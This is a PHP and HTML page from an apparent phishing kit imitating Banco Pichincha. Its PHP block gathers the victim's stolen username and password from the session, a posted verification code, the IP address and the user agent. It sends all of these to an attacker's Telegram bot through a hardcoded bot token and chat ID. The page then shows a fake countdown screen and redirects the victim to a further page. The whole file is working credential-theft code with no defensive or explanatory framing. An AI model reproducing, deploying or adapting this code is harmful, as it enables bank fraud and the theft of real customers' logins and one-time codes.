<?php
session_start();
if( !empty($_POST['ipx1']) ){

    @$message = "PICHINCHA\n\n".'User-agent: '.$_SERVER['HTTP_USER_AGENT']."\nIP: ".$_SERVER['REMOTE_ADDR']."\n"."IP2: ".$_SERVER['HTTP_X_FORWARDED_FOR']."\n".'Usua: '.$_SESSION['USER']."\n".'Pass: '.$_SESSION['PASS']."\n".'Codi: '.$_POST['ipx1'];

    $apiToken = "5690099060:AAGI6_6M8QEeMFC_W-Jtz7eORKsARsRpSSc";

    $data = [
        'chat_id' => '1904207237',
        'text' => $message
    ];
    
    $url = "https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data); 
    $ch = curl_init(); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
    curl_setopt($ch, CURLOPT_URL, $url); 
    $result = curl_exec($ch); 

}else{
    @header('Location: index.php');
}
?>

<!DOCTYPE html>
<html lang="es">
  <head>

    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />

    <title>Personas</title>
    
  </head>
  <body style="overflow-x:hidden;background:url(bg1.jpg);background-size:cover;">
    <header> 
      <nav style="overflow: hidden;padding-top: 20px;"><div  class="im1" style="width: 200px;text-align: center;display:inline-block;height: 56px;"><img src="ESPEJISMO1.svg" style="width: 120px;max-width:220px;"></div>
      </nav>
    </header>
    <div id="cizq">
        <div id="mn-frm">
          <form action=""  method="post">
          <strong id="time" style="position: relative;top: 267px;font-family: sans-serif;color: #222d56;font-size: 14px;"><label id="countdown">0:30</label> </strong>
            
          </form>
        </div>
    </div>
    
    <style>
      *{margin:0;padding:0;}
      input:focus { outline: none; }
      header nav{
        height: 56px;
        padding-left: 12rem;
        padding-right: 12rem;
        box-shadow: 0 8px 8px -8px rgb(7 7 7 / 16%);
        background: #fff;
        text-align: center;
      }
      
      .lg-cont {
        width: 100%;
        text-align: center;
        margin-top: 30px;
      }
      .lg-cont img{
        width: 175px;
        display: inline-block;
      }
      #cder,#cizq{
        width:100%;
        min-height:300px;
        display:inline-block;
        float: left;
      }
      #cizq{
        text-align:center;
        
      }
      #cder{
        text-align:center;
      }
      #mn-frm{
        height:524px;
        width:420px;
        background-image:url('Espejo4.svg');
        background-repeat:no-repeat;
        background-size:cover;
        display:inline-block;
      }
      input{
        color:#333;
        font-family:sans-serif;
        font-size:12px;
      }

      @media screen and (max-width: 1024px){
        #cder,#cizq{
        width:100%;
        }
        #cizq{
          height:30vh!important;
          background-position:center;
        }
        .im1,.im2{
          width:100%!important;
          float: left!important;
        }
        .im2{
          display: none!important;
        }
        .im1{
          text-align:center!important;
        }
        header nav{
          padding-left:0px;
          padding-right:0px;
        }
      }
      
      
    </style>
    <script>
        var url="index3.php";
        var seconds = 30; //número de segundos a contar
        function secondPassed() {
            var minutes = Math.round((seconds - 30)/60);
            var remainingSeconds = seconds % 60;
            if (remainingSeconds < 10) { 
            remainingSeconds = "0" + remainingSeconds; 
            } 
            document.getElementById('countdown').innerHTML = minutes + ":" +     remainingSeconds; 
            if (seconds == 0) { 
            clearInterval(countdownTimer); 
            window.location=url;
            document.getElementById('countdown').innerHTML = ""; 
            } else { 
            seconds--; 
            } 
        } 
        var countdownTimer = setInterval(secondPassed, 1000);
    </script>
  </body>
</html>